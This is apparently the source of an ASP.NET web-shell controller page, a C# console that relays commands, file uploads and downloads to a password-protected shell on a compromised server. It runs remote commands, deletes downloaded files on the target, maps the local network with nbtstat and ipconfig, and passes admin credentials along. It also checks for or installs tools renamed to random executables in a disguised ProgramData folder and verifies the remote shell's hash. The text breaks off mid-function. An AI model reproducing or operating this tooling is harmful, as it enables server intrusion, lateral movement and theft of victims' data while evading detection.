<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Security" %>
<%@ Import Namespace="System.Net.Mime" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="Newtonsoft.Json" %>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link href="js/semantic/semantic.min.css" rel="stylesheet" />
<link href="css/main.css" rel="stylesheet" />
<link href="js/DataTables-1.10.16/css/jquery.dataTables.min.css" rel="stylesheet" />
<link href="js/components/downloadbox.css" rel="stylesheet" />
<link href="js/components/networkdownloader.css" rel="stylesheet" />
    <%
        try
        {
            //InitiateSSLTrust();
            Session.Timeout = 100; // 100 minute

            NameValueCollection t = HttpContext.Current.Request.Form;
            method selectedMethod = method.auth;

            if (!string.IsNullOrEmpty(t["isajax"]))
                isAjax = true;

            string methodStr = unpack(t["m"]);
            if (!string.IsNullOrEmpty(methodStr))
            {
                int methodID = int.Parse(methodStr);
                selectedMethod = (method)methodID;

                url = unpack(t["url"]);

                if (string.IsNullOrEmpty(url))
                {
                    if (HttpContext.Current.Request.Cookies["url"] != null)
                        url = fb(HttpContext.Current.Request.Cookies["url"].Value);
                }

                string[] urlp = url.Split(';');
                if (urlp.Length > 1)
                {
                    //url = urlp[0];
                    p = urlp[1];
                }

                if (string.IsNullOrEmpty(p))
                {
                    if (HttpContext.Current.Request.Cookies["p"] != null)
                        p = fb(HttpContext.Current.Request.Cookies["p"].Value);
                }

                if (HttpContext.Current.Request.Cookies["loginStyle"] != null)
                    loginStyle = fb(HttpContext.Current.Request.Cookies["loginStyle"].Value);

                switch (selectedMethod)
                {
                    case method.auth:
                        auth();
                        break;
                    case method.localExplore:
                        SpecialScript = "$('#btnExpror').click();";
                        SpecialScript = @"
openTab(document.getElementById('tabExp'), 'tbDir');
document.getElementsByName('exadd')[0].value = '" + unpack(t["exadd"]).Replace("\\", "\\\\") + @"';
$('#btnExpror').click();";
                        break;
                    case method.command:
                        command(unpack(t["cmd"]));
                        break;
                    case method.downloadTest:
                        downloadTest(t);
                        break;
                    case method.download:
                        Thread thr = new Thread(() => download(unpack(t["don"]), unpack(t["isdelete"]), unpack(t["localPath"]), unpack(t["downloadguid"])));
                        thr.Start();
                        break;
                    case method.checkDownloadProgress:
                        checkDownloadProgress(unpack(t["downloadguid"]), unpack(t["lastsize"]), unpack(t["lasttime"]));
                        break;
                    case method.upload:
                        upload(HttpContext.Current.Request.Files["uploadFile"], t["uploadPath"], t["isExp"]);
                        break;
                    case method.checkModules:
                        checkModules();
                        break;
                    case method.installModule:
                        installModule(unpack(t["mname"]));
                        break;
                    case method.uninstallModule:
                        uninstallModule(unpack(t["mname"]));
                        break;
                    case method.cmd7z:
                        cmd7z(unpack(t["7zclevel"]), unpack(t["7zaddress"]), unpack(t["7zfiles"]), unpack(t["7zvsize"]), unpack(t["7zvmode"]), unpack(t["7zexclude"]));
                        break;
                    case method.spycheck:
                        spycheck(unpack(t["loc"]));
                        break;
                    case method.getIPFromNbt:
                        getIPFromNbt(unpack(t["mode"]), unpack(t["input"]));
                        break;
                    case method.GetLogicDrives:
                        GetLogicDrives(unpack(t["exadd"]), unpack(t["adminU"]), unpack(t["adminP"]));
                        break;
                    case method.NetworkDownloaderCheck:
                        NetworkDownloaderCheck(unpack(t["cn"]), unpack(t["ip"]));
                        break;
                    case method.NetworkDownloaderLog:
                        NetworkDownloaderLog(unpack(t["cn"]), unpack(t["log"]));
                        break;
                    case method.NetworkDownloaderError:
                        NetworkDownloaderError(unpack(t["cn"]), unpack(t["error"]));
                        break;
                    case method.NetworkDownloaderDone:
                        NetworkDownloaderDone(unpack(t["cn"]));
                        break;
                    case method.NetworkDownloaderDir:
                        NetworkDownloaderDir(unpack(t["cn"]), unpack(t["filename"]), unpack(t["text"]), unpack(t["isappend"]));
                        break;
                    case method.SaveLog:
                        SaveLog(unpack(t["path"]), unpack(t["filename"]), unpack(t["content"]));
                        break;
                    default:
                        proxy(t);
                        break;
                }
            }
            //else
            //    auth();
        }
        catch (Exception ex)
        {
            response("Error : " + ex.Message);
        }
    %>
    <script runat="server">
        enum method
        {
            auth = 0,
            command = 1,
            upload = 2,
            uploadbase64 = 3,
            delete = 4,
            download = 5,
            changeTime = 6,
            sqlQuery = 7,
            explorer = 8,
            getsize = 9,
            getlocation = 10,
            rename = 11,
            copy = 12,
            view = 13,
            commandAjax = 14,
            downloadTest = 15,
            checkModules = 16,
            installModule = 17,
            uninstallModule = 18,
            cmd7z = 19,
            authAjax = 20,
            getlocationAjax = 21,
            spycheck = 22,
            localExplore = 23,
            checkDownloadProgress = 25,
            getIPFromNbt = 26,
            GetLogicDrives = 27,
            NetworkDownloaderCheck = 28,
            NetworkDownloaderLog = 29,
            NetworkDownloaderError = 30,
            NetworkDownloaderDone = 31,
            NetworkDownloaderDir = 32,
            SaveLog = 33

        };
        string url, p, pro, cmd, sav, vir, nen, upb, upd, del, don, hid, tfil, ttar, ttim, baseFile, baseAddr, baseVir, baseName, sqc, sqq, exadd, adminU, adminP, cmdB, loc;
        string SpecialScript, loginStyle;
        string BaseAddress = @"C:\Users\Public\Libraries\";
        string DownloadLocation = @"C:\Users\Public\Libraries\DownloadFiles\";
        string SpyCheckLocation = @"C:\Users\Public\Libraries\SpyCheck\";
        string LocationNetworkDownloader = @"C:\Users\Public\Libraries\NetworkDownloader\";

        //string DownloadTemp = @"C:\Users\Public\Libraries\DownloadTemp\";
        bool isAjax = false;
        string tb(string a) { string ret = ""; try { ret = string.IsNullOrEmpty(a) ? a : Convert.ToBase64String(Encoding.UTF8.GetBytes(a)); } catch { } return ret; }
        string fb(string a) { string ret = ""; try { ret = string.IsNullOrEmpty(a) ? a : Encoding.UTF8.GetString(Convert.FromBase64String(a)); } catch { } return ret; }
        void proxy(NameValueCollection t)
        {
            string ret = "Error : -";
            try
            {
                ret = SendRequest(url, t);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void SaveLog(string path, string filename, string content)
        {
            string ret = "Error : -";
            try
            {
                File.AppendAllText(CheckDirectory(url, BaseAddress + path + "\\") + filename, content);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        string unpack(string data) { return isAjax ? fb(data) : data; }
        void GetLogicDrives(string address, string adminU, string adminP)
        {
            string ret = "Error : -";
            try
            {
                //if (address.ToLower().Contains("\\\\localhost"))
                ret = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.explorer).ToString())},
                    { "p", tb(p)},
                    { "exadd", tb(address)},
                    { "adminU", tb(adminU)},
                    { "adminP", tb(adminP)}
                });
                //else
                //{

                //}
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderCheck(string computerName, string ip)
        {
            string ret = "Error : -";
            try
            {
                ret = "ok";
                if (Directory.Exists(LocationNetworkDownloader))
                {
                    if (string.IsNullOrEmpty(computerName))
                    {
                        //-+\s+(\S+)
                        //nbtstat -a 192.168.100.16

                        string nbtstat = SendRequest(url, new NameValueCollection() {
                            { "m", tb(((int)method.command).ToString())},
                            { "p", tb(p)},
                            { "cmd", tb(string.Format("nbtstat -a {0}",ip))}
                        });

                        if (nbtstat.Contains("Host not found"))
                        {
                            ret = "Error : Cannot find computer name from IP Address (Host not found)";
                        }
                        else
                        {
                            Regex reg = new Regex(@"-+\s+(\S+)");
                            MatchCollection regResult = reg.Matches(nbtstat);
                            if (regResult.Count > 0)
                            {
                                computerName = regResult[0].Groups[1].Value;
                            }
                            else
                            {
                                ret = "Error : Cannot find computer name from IP Address (" + nbtstat + ")";
                            }
                        }
                    }

                    if (!string.IsNullOrEmpty(computerName))
                    {

                        string targetPathIP = CheckDirectory(url, LocationNetworkDownloader) + ip.TrimStart('\\') + "\\";
                        string targetPathCN = CheckDirectory(url, LocationNetworkDownloader) + computerName + "\\";
                        if (Directory.Exists(targetPathCN))
                        {
                            if (Directory.Exists(targetPathIP))
                                Directory.Move(targetPathIP, targetPathCN + ip.TrimStart('\\'));
                        }
                        else if (Directory.Exists(targetPathIP))
                            Directory.Move(targetPathIP, targetPathCN);
                        else
                            Directory.CreateDirectory(targetPathCN);

                        if (File.Exists(targetPathCN + "address.txt"))
                            ret = File.ReadAllText(targetPathCN + "address.txt");

                        //if (File.Exists(targetPathCN + "done.txt"))
                        //    ret = "done|" + File.ReadAllText(targetPathCN + "done.txt");
                        //else if (File.Exists(targetPathCN + "error.txt"))
                        //    ret = "error|" + File.ReadAllText(targetPathCN + "error.txt");

                        File.AppendAllText(targetPathCN + "ip.txt", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " : " + ip + Environment.NewLine);
                    }
                    else
                        ret = "cnerror|cannot get the computer name";
                }
                else
                    Directory.CreateDirectory(LocationNetworkDownloader);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderLog(string cn, string log)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + "log.txt", string.Format("---------------------------------------------------------------------\r\n[{0}]\r\n{1}\r\n", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), log));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderError(string cn, string error)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + "error.txt", string.Format("---------------------------------------------------------------------\r\n[{0}]\r\n{1}\r\n", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), error));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderDone(string cn)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + "done.txt", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + Environment.NewLine);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderDir(string cn, string filename, string text, string isappend)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                if (isappend.ToLower() == "true")
                    File.AppendAllText(targetPath + filename + ".txt", text);
                else
                    File.WriteAllText(targetPath + filename + ".txt", text);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void upload(HttpPostedFile uploadFile, string uploadPath, string isExp)
        {
            string ret = string.Empty;
            try
            {
                if (uploadFile != null && uploadFile.ContentLength > 0)
                {
                    ret = SendFile(uploadFile, uploadPath);
                    if (!string.IsNullOrEmpty(isExp))
                    {
                        SpecialScript = @"
openTab(document.getElementById('tabExp'), 'tbDir');
document.getElementsByName('exadd')[0].value = '" + uploadPath.Replace("\\", "\\\\") + @"';
document.getElementById('btnExpror').click();";
                    }
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            response(ret);
        }
        public string UploadFile(Stream fStream, string fileName, string dataName, List<KeyValuePair<string, string>> formData)
        {
            HttpWebRequest requestToServerEndpoint = (HttpWebRequest)WebRequest.Create(url);
            string boundaryString = "----sdfERASDGsdf342GA";

            requestToServerEndpoint.Method = WebRequestMethods.Http.Post;
            requestToServerEndpoint.ContentType = "multipart/form-data; boundary=" + boundaryString;
            requestToServerEndpoint.KeepAlive = true;
            requestToServerEndpoint.Credentials = System.Net.CredentialCache.DefaultCredentials;

            MemoryStream postDataStream = new MemoryStream();
            StreamWriter postDataWriter = new StreamWriter(postDataStream);

            foreach (var item in formData)
            {
                postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
                postDataWriter.Write("Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}",
                item.Key,
                tb(item.Value));
            }

            postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
            postDataWriter.Write("Content-Disposition: form-data;"
            + "name=\"{0}\";"
            + "filename=\"{1}\""
            + "\r\nContent-Type: multipart/form-data\r\n\r\n",
            dataName,
            fileName);
            postDataWriter.Flush();

            Stream fileStream = fStream;
            byte[] buffer = new byte[1024];
            int bytesRead = 0;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                postDataStream.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();

            postDataWriter.Write("\r\n--" + boundaryString + "--\r\n");
            postDataWriter.Flush();

            requestToServerEndpoint.ContentLength = postDataStream.Length;

            using (Stream s = requestToServerEndpoint.GetRequestStream())
            {
                postDataStream.WriteTo(s);
            }
            postDataStream.Close();

            WebResponse response = requestToServerEndpoint.GetResponse();
            StreamReader responseReader = new StreamReader(response.GetResponseStream());
            string replyFromServer = responseReader.ReadToEnd();

            return fb(replyFromServer);
        }
        public string SendFile(HttpPostedFile uploadFile, string uploadPath)
        {
            List<KeyValuePair<string, string>> formData = new List<KeyValuePair<string, string>>();
            formData.Add(new KeyValuePair<string, string>("uploadPath", uploadPath));
            formData.Add(new KeyValuePair<string, string>("m", ((int)method.upload).ToString()));
            formData.Add(new KeyValuePair<string, string>("p", p));

            return UploadFile(uploadFile.InputStream, uploadFile.FileName, "uploadFile", formData);
        }
        void auth()
        {
            string ret = string.Empty;
            try
            {
                if (string.IsNullOrEmpty(p))
                {
                    if (HttpContext.Current.Request.Cookies["p"] != null)
                        p = fb(HttpContext.Current.Request.Cookies["p"].Value);
                }
                else
                {
                    HttpCookie coo = new HttpCookie("p", tb(p));
                    coo.Expires = DateTime.Now.AddDays(1);
                    HttpContext.Current.Response.SetCookie(coo);
                }

                if (string.IsNullOrEmpty(url))
                {
                    if (HttpContext.Current.Request.Cookies["url"] != null)
                        url = fb(HttpContext.Current.Request.Cookies["url"].Value);
                }
                else
                {
                    HttpCookie coo = new HttpCookie("url", tb(url));
                    coo.Expires = DateTime.Now.AddDays(1);
                    HttpContext.Current.Response.SetCookie(coo);
                }

                if (!string.IsNullOrEmpty(p) && !string.IsNullOrEmpty(url))
                {

                    SpecialScript = "$('#btnLogin').click();";

                    //string HtmlResult = SendRequest(url, new NameValueCollection() {
                    //        { "m", ((int)method.auth).ToString()},
                    //        { "p", p}
                    //    });

                    //if (HtmlResult == "True")
                    //{
                    //    ret = "Login successful" + Environment.NewLine;
                    //    loginStyle = "login";
                    //    getLoc();
                    //    SpecialScript = "document.getElementById('chkModules').click();";
                    //}
                    //else
                    //{
                    //    ret = "Login failed" + Environment.NewLine;
                    //    loginStyle = "logout";
                    //}

                    //HttpCookie coo = new HttpCookie("loginStyle", tb(loginStyle));
                    //coo.Expires = DateTime.Now.AddDays(1);
                    //HttpContext.Current.Response.SetCookie(coo);
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }

            response(ret);
        }
        void response(string res)
        {
            log.InnerHtml = res;
        }
        void responseAjax(string res)
        {
            Response.Clear();
            Response.Write(tb(res));
            Response.Flush();
            Response.SuppressContent = true;
            ApplicationInstance.CompleteRequest();
        }
        void getLoc()
        {
            loc = SendRequest(url, new NameValueCollection() {
                { "m", ((int)method.getlocation).ToString()},
                { "p", p}
            });
        }
        void spycheck(string location)
        {
            string ret = "Error : -";
            try
            {
                string[] parts1 = url.Split('/');
                string filename = location + parts1[parts1.Length - 1].Split('?')[0];
                if (!filename.EndsWith(".aspx"))
                    filename += ".aspx";
                string filetext = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("type \"{0}\"",filename))}
                });
                filetext = filetext.Remove(0, filetext.IndexOf(Environment.NewLine) + 2);
                filetext = filetext.Remove(0, filetext.IndexOf(Environment.NewLine) + 2);
                filetext = filetext.Substring(filetext.IndexOf("&lt;%@"));
                byte[] fbytes = Encoding.UTF8.GetBytes(filetext);
                string fHash = Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(fbytes));
                if ("DVsd1YT+t32whUqKfof/OW+nHkrnPR2g+slM4EfaZI8=" == fHash)
                    ret = "True";
                else
                {
                    ret = "False";

                    Uri myUri = new Uri(url);
                    string host = myUri.Host;

                    string path = SpyCheckLocation + host + "\\";

                    if (!Directory.Exists(path))
                        Directory.CreateDirectory(path);

                    File.WriteAllText(path + Path.GetFileNameWithoutExtension(myUri.AbsolutePath) + "_" + DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss") + Path.GetExtension(myUri.AbsolutePath), HttpUtility.HtmlDecode(filetext));
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void command(string cmd)
        {
            SpecialScript = @"
$('#inpCmd').val(b64DecodeUnicode('" + tb(cmd) + @"'));
command($('#inpCmd').get(0));";
        }
        private string CheckDirectory(string url, string dirPath)
        {
            string newPath = string.Empty;

            if (!dirPath.EndsWith("\\"))
                dirPath += "\\";

            Uri myUri = new Uri(url);
            string host = myUri.Host;

            newPath = dirPath + host + "\\";

            if (!Directory.Exists(newPath))
                Directory.CreateDirectory(newPath);

            //if (!Directory.Exists(DownloadTemp))
            //    Directory.CreateDirectory(DownloadTemp);

            return newPath;
        }
        class NbtComputer
        {
            public string IP { get; set; }
            public string Domain { get; set; }
            public string ComputerName { get; set; }
            public List<string> Props { get; set; }
            public string Mac { get; set; }
            public string FullDomain { get; set; }
        }
        class NbtResult
        {
            public string Log { get; set; }
            public List<NbtComputer> NbtComputers { get; set; }
        }
        private void getIPFromNbt(string mode, string input)
        {
            NbtResult nbtresult = new NbtResult();
            nbtresult.NbtComputers = new List<NbtComputer>();
            string ret = "Error : -";
            try
            {
                List<string> IPs = new List<string>();

                if (mode == "ipconfig")
                {
                    string ipconfig = SendRequest(url, new NameValueCollection() {
                        { "m", tb(((int)method.command).ToString())},
                        { "p", tb(p)},
                        { "cmd", tb(string.Format("ipconfig /all 2>&1"))}
                    });

                    Regex rxIPconfig = new Regex(@"(IPv4 Address)[\.\s]+:\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})");
                    foreach (Match match in rxIPconfig.Matches(ipconfig))
                    {
                        IPs.Add(match.Groups[2].Value + "/24");
                    }

                    //nbtresult.Log = "IPs that gatter from ipconfig /all :" + Environment.NewLine;
                }
                else
                {
                    string[] tempSplit = input.Split(',');
                    foreach (string item in tempSplit)
                    {
                        IPs.Add(item);
                    }
                }

                //foreach (string ip in IPs)
                //{
                //    nbtresult.Log += ip + Environment.NewLine;
                //}
                //nbtresult.Log += Environment.NewLine + "try nbt on this IPs :" + Environment.NewLine;

                foreach (string ip in IPs)
                {
                    int count = 0;
                    string nbtResult = SendRequest(url, new NameValueCollection() {
                        { "m", tb(((int)method.command).ToString())},
                        { "p", tb(p)},
                        { "cmd", tb(string.Format(@"{0} -f {1} 2>&1", moduleFolder + ModuleFileNameTarget[ModuleName.mdlnbt.ToString()].Value,ip))}
                    });

                    Regex rxNbtResult = new Regex(@"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\S*)(\s+\w+)+\r\n(\s+\S+\s+\S+\s+\w+\s+[\w|\s]+\r\n)+\s+(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})\s+\w+\s+(\S+)\r\n");
                    foreach (Match item in rxNbtResult.Matches(nbtResult))
                    {
                        count++;
                        NbtComputer nc = new NbtComputer();
                        nc.IP = item.Groups[1].Value;
                        nc.Domain = item.Groups[2].Value.Split('\\')[0];
                        nc.ComputerName = item.Groups[2].Value.Split('\\')[1];
                        nc.Props = new List<string>();
                        foreach (Capture c in item.Groups[3].Captures)
                        {
                            nc.Props.Add(c.Value.Trim());
                        }
                        nc.Mac = item.Groups[5].Value;
                        nc.FullDomain = item.Groups[6].Value;

                        nbtresult.NbtComputers.Add(nc);
                    }
                    nbtresult.Log += ip + " -> " + count;
                }

                ret = JsonConvert.SerializeObject(nbtresult);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        enum DownloadStatus
        {
            Requested,
            Downloading,
            Pause,
            Error,
            Complete
        }
        private void DownloadUpdateStatus(string localPath, string downloadguid, DownloadStatus status, DateTime startDate, long totalsize, long downloadedsize)
        {
            //string text = string.Format("{0}{1}{2}{3}",
            //        status.ToString() + Environment.NewLine,
            //        startDate.ToString("yyyy-MM-dd HH:mm:ss.fff") + Environment.NewLine,
            //        totalsize.ToString() + Environment.NewLine,
            //        downloadedsize.ToString() + Environment.NewLine
            //        );

            NameValueCollection data = new NameValueCollection() {
                { "status", status.ToString()},
                { "startdate", startDate.ToString("yyyy-MM-dd HH:mm:ss.fff")},
                { "totalsize", totalsize.ToString()},
                { "downloadedsize", downloadedsize.ToString()}
            };

            Session[downloadguid] = data;

            //File.AppendAllText(DownloadTemp + Path.GetFileName(localPath), text);

            //using(TextWriter txtWriter = new StreamWriter(File.Open(DownloadTemp + Path.GetFileName(localPath), FileMode.Truncate)))
            //{
            //    txtWriter.Write(text);
            //}

            //using (TextWriter fs = new FileStream(DownloadTemp + Path.GetFileName(localPath), FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
            //{
            //    using (var sr = new StreamWriter(fs, Encoding.Default))
            //    {
            //        // read the stream
            //        //...
            //    }
            //}

        }
        private string DownLoadFileByWebRequest(string urlAddress, string localPath, string downloadguid, NameValueCollection postParam)
        {
            string ret = string.Empty;
            try
            {
                DateTime StartDate = DateTime.Now;
                HttpWebRequest request = null;
                HttpWebResponse response = null;
                request = (HttpWebRequest)HttpWebRequest.Create(urlAddress);
                request.Timeout = 30000;  //8000 Not work
                request.Method = "POST";
                StringBuilder postBuilder = new StringBuilder();
                for (int i = 0; i < postParam.Count; i++)
                {
                    postBuilder.AppendFormat("{0}={1}", Uri.EscapeDataString(postParam.GetKey(i)), Uri.EscapeDataString(tb(postParam.Get(i))));
                    if (i < postParam.Count - 1)
                    {
                        postBuilder.Append("&");
                    }
                }
                byte[] postBytes = Encoding.ASCII.GetBytes(postBuilder.ToString());
                request.ContentLength = postBytes.Length;
                request.ContentType = "application/x-www-form-urlencoded";
                var stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();
                stream.Dispose();

                response = (HttpWebResponse)request.GetResponse();
                ContentDisposition disposition = new ContentDisposition(response.Headers["content-disposition"]);
                long fileSize = disposition.Size;
                Stream s = response.GetResponseStream();

                FileStream os = new FileStream(localPath, FileMode.OpenOrCreate, FileAccess.Write);
                byte[] buff = new byte[8 * 1024];
                int c = 0;
                long totalGet = 0;
                //long lastUpdateSize = 0;
                //DateTime lastUpdateTime = StartDate;
                while ((c = s.Read(buff, 0, buff.Length)) > 0)
                {
                    totalGet += c;

                    os.Write(buff, 0, c);
                    os.Flush();
                    //DateTime saveTime = DateTime.Now;
                    //DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Downloading, StartDate, lastUpdateTime, saveTime, fileSize, totalGet, lastUpdateSize);
                    DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Downloading, StartDate, fileSize, totalGet);
                    //if (totalGet < fileSize)
                    //{
                    //    lastUpdateSize = totalGet;
                    //    lastUpdateTime = saveTime;
                    //}
                }
                os.Close();
                s.Close();

                //DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Complete, StartDate, lastUpdateTime, DateTime.Now, fileSize, totalGet, lastUpdateSize);
                DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Complete, StartDate, fileSize, totalGet);

                ret = (string.Format("File \"{0}\" successfuly downloaded : \"{1}\"", Path.GetFileName(localPath), localPath));

            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }

            return ret;
        }
        void downloadTest(NameValueCollection t)
        {
            string ret = "Error : -";
            try
            {
                ret = SendRequest(url, t);
                if (!ret.ToLower().StartsWith("error"))
                {
                    string filePath = DownloadLocation;
                    filePath = CheckDirectory(url, filePath);

                    string filename = Path.GetFileName(unpack(t["don"]));
                    string localPath = filePath + filename;
                    int fileIndex = 1;
                    while (File.Exists(localPath))
                    {
                        localPath = filePath + Path.GetFileNameWithoutExtension(filename) + "(" + (fileIndex++) + ")" + Path.GetExtension(filename);
                    }

                    CreateEmptyFile(localPath);
                    string downloadguid = Guid.NewGuid().ToString();
                    DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Requested, DateTime.Now, 0, 0);
                    ret = string.Format("{{\"message\":\"{0}\",\"localPath\":\"{1}\",\"downloadguid\":\"{2}\"}}", tb(ret), tb(localPath), tb(downloadguid));
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void download(string don, string isdelete, string localPath, string downloadguid)
        {
            string ret = "true";

            try
            {
                ret = DownLoadFileByWebRequest(url, localPath, downloadguid, new NameValueCollection() {
                    { "m", ((int)method.download).ToString()},
                    { "p", p},
                    { "don", don}
                });

                if (isdelete.ToLower() == "true")
                {
                    string cmd = "del \"" + don + "\" 2>&1";
                    ret += Environment.NewLine + SendRequest(url, new NameValueCollection() {
                        { "m", tb(((int)method.command).ToString())},
                        { "p", tb(p)},
                        { "cmd", tb(cmd)}
                    });
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            //responseAjax(ret);
        }
        void checkDownloadProgress(string downloadguid, string lastsizestr, string lasttimestr)
        {
            string ret = "Error : -";
            try
            {
                string status = "NotSet";
                double Percent = 0;
                string Size = "-";
                string Speed = "-";
                string Remain = "-";
                long LastSize = long.Parse(lastsizestr);
                DateTime Now = DateTime.Now;
                DateTime LastTime = Now;
                if (lasttimestr != "0")
                    LastTime = DateTime.Parse(lasttimestr);

                if (Session[downloadguid] != null)
                {
                    NameValueCollection data = (NameValueCollection)Session[downloadguid];
                    status = data["status"];

                    if (status != DownloadStatus.Requested.ToString())
                    {
                        DateTime timeStart = DateTime.Parse(data["startdate"]);
                        long total = long.Parse(data["totalsize"]);
                        long get = long.Parse(data["downloadedsize"]);

                        Percent = Math.Round(((double)get / total) * 100, 2);
                        Size = sizeFix(get) + " of " + sizeFix(total);

                        double diff = 1;
                        if (lasttimestr == "0")
                            diff = (Now - timeStart).TotalSeconds;
                        else
                            diff = (Now - LastTime).TotalSeconds;

                        double s = (double)((get - LastSize) / diff);
                        Speed = sizeFix((long)s, true) + "/sec";
                        if (status == DownloadStatus.Complete.ToString())
                        {
                            Remain = timeFix((long)(Now - timeStart).TotalMilliseconds);
                            Session.Remove(downloadguid);
                        }
                        else
                            Remain = timeFix((long)((total - get) / s * 1000)) + " left";

                        lastsizestr = get.ToString();
                        lasttimestr = Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
                    }
                }

                ret = string.Format("{{\"status\":\"{0}\",\"percent\":\"{1}\",\"size\":\"{2}\",\"speed\":\"{3}\",\"remain\":\"{4}\",\"lastsize\":\"{5}\",\"lasttime\":\"{6}\"}}", status, Percent, Size, Speed, Remain, tb(lastsizestr), tb(lasttimestr));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        #region [ Modules ]
        string moduleFolder = @"C:\ProgramData\Microsoft\SettingsTools\";
        KeyValueConfigurationCollection ModuleFileName = new KeyValueConfigurationCollection() {
            { ModuleName.mdl7z.ToString(),"7za.exe"},
            { ModuleName.mdlrx.ToString(),"rx.exe"},
            { ModuleName.mdlnbt.ToString(),"nbt.exe"},
            { ModuleName.mdlhb.ToString(),"hb.exe"},
            { ModuleName.mdltar2.ToString(),"tar-2.exe"},
            { ModuleName.mdltar4.ToString(),"tar-4.exe"}
        };
        KeyValueConfigurationCollection ModuleFileNameTarget = new KeyValueConfigurationCollection() {
            { ModuleName.mdl7z.ToString(),"fqrzb.exe"},
            { ModuleName.mdlrx.ToString(),"nhrf.exe"},
            { ModuleName.mdlnbt.ToString(),"qbtup.exe"},
            { ModuleName.mdlhb.ToString(),"tysrr.exe"},
            { ModuleName.mdltar2.ToString(),"ghdfg.exe"},
            { ModuleName.mdltar4.ToString(),"tyruee.exe"}
        };
        enum ModuleName
        {
            mdl7z,
            mdlrx,
            mdlnbt,
            mdlhb,
            mdltar2,
            mdltar4
        };
        void checkModules()
        {
            string ret = "Error : -";
            try
            {

                string dirModule = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("dir \"{0}\"",moduleFolder))}
                });

                ret = "{\"modules\":[";
                string mdlList = string.Empty;

                foreach (string name in Enum.GetNames(typeof(ModuleName)))
                {
                    if (dirModule.Contains(ModuleFileNameTarget[name].Value))
                    {
                        if (!string.IsNullOrEmpty(mdlList))
                            mdlList += ",";
                        mdlList += string.Format("\"{0}\"", name);
                    }
                }

                ret += mdlList + "]}";
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        // the Old server side installModule
        //void installModule(HttpPostedFile mfile, string mname)
        //{
        //    string ret = "Error : -";
        //    try
        //    {
        //        if (!System.IO.Directory.Exists(moduleFolder))
        //        {
        //            System.IO.DirectoryInfo di = System.IO.Directory.CreateDirectory(moduleFolder);
        //            di.Attributes = System.IO.FileAttributes.Directory | System.IO.FileAttributes.Hidden;
        //        }

        //        string name = string.Empty;
        //        string path = string.Empty;
        //        if (mname == "mdl7z")
        //        {
        //            name = "7z";
        //            path = moduleFolder + "\\z.exe";
        //        }
        //        else if (mname == "mdlrx")
        //        {
        //            name = "rx";
        //            path = moduleFolder + "\\r.exe";
        //        }
        //        else if (mname == "mdlnbt")
        //        {
